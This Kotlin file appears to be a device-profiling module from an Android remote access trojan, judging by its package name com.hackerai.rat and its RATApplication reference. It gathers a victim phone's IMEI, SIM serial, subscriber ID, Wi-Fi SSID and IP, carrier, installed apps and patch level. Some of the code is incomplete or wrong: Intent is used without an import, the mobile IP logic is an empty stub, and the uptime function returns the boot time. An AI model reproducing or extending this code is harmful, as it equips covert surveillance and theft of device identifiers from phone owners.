package com.hackerai.rat.utils

import android.app.ActivityManager
import android.content.Context
import android.content.pm.PackageInfo
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.wifi.WifiManager
import android.os.Build
import android.telephony.TelephonyManager
import java.io.BufferedReader
import java.io.File
import java.io.InputStreamReader

object DeviceUtils {
    data class DeviceInfo(
        val manufacturer: String = Build.MANUFACTURER,
        val model: String = Build.MODEL,
        val androidVersion: String = Build.VERSION.RELEASE,
        val sdkLevel: Int = Build.VERSION.SDK_INT,
        val buildFingerprint: String = Build.FINGERPRINT,
        val kernelVersion: String = getKernelVersion(),
        val securityPatch: String = Build.VERSION.SECURITY_PATCH,
        val imei: String = "",
        val simSerial: String = "",
        val subscriberId: String = "",
        val deviceId: String = com.hackerai.rat.RATApplication.deviceId
    )

    data class BatteryInfo(
        val level: Int,
        val isCharging: Boolean,
        val temperature: Float
    )

    data class NetworkInfo(
        val wifiSsid: String,
        val wifiIp: String,
        val mobileIp: String,
        val operator: String
    )

    fun getDeviceInfo(context: Context): DeviceInfo {
        val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
        return DeviceInfo(
            imei = try { tm?.imei ?: "" } catch (e: Exception) { "" },
            simSerial = try { tm?.simSerialNumber ?: "" } catch (e: Exception) { "" },
            subscriberId = try { tm?.subscriberId ?: "" } catch (e: Exception) { "" }
        )
    }

    fun getBatteryInfo(context: Context): BatteryInfo {
        val intent = context.registerReceiver(null, android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val level = intent?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, 0) ?: 0
        val scale = intent?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, 100) ?: 100
        val temperature = intent?.getIntExtra(android.os.BatteryManager.EXTRA_TEMPERATURE, 0) ?: 0
        val status = intent?.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1) ?: -1
        val isCharging = status == android.os.BatteryManager.BATTERY_STATUS_CHARGING ||
                status == android.os.BatteryManager.BATTERY_STATUS_FULL
        return BatteryInfo(
            level = level * 100 / scale,
            isCharging = isCharging,
            temperature = temperature / 10.0f
        )
    }

    fun getNetworkInfo(context: Context): NetworkInfo {
        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val wm = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
        val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
        
        var wifiSsid = ""
        var wifiIp = ""
        try {
            val wifiInfo = wm.connectionInfo
            wifiSsid = wifiInfo.ssid?.removeSurrounding("\"") ?: ""
            val ipInt = wifiInfo.ipAddress
            wifiIp = "${ipInt and 0xFF}.${(ipInt shr 8) and 0xFF}.${(ipInt shr 16) and 0xFF}.${(ipInt shr 24) and 0xFF}"
        } catch (e: Exception) {}

        var mobileIp = ""
        try {
            val network = cm.activeNetwork
            val caps = cm.getNetworkCapabilities(network)
            // Extract IP from network
        } catch (e: Exception) {}

        val operator = try { tm?.networkOperatorName ?: "" } catch (e: Exception) { "" }

        return NetworkInfo(wifiSsid, wifiIp, mobileIp, operator)
    }

    fun getInstalledPackages(context: Context): List<Map<String, Any>> {
        val pm = context.packageManager
        val packages = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            pm.getInstalledPackages(PackageManager.PackageInfoFlags.of(0))
        } else {
            pm.getInstalledPackages(0)
        }
        return packages.filter { 
            it.applicationInfo != null && 
            (it.applicationInfo.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) == 0
        }.map { pkg ->
            mapOf(
                "appName" to pm.getApplicationLabel(pkg.applicationInfo).toString(),
                "packageName" to pkg.packageName,
                "versionCode" to pkg.longVersionCode
            )
        }
    }

    private fun getKernelVersion(): String {
        return try {
            val process = Runtime.getRuntime().exec("uname -r")
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            reader.readLine() ?: "Unknown"
        } catch (e: Exception) {
            "Unknown"
        }
    }

    fun getUptime(): Long {
        return System.currentTimeMillis() - android.os.SystemClock.elapsedRealtime()
    }
}
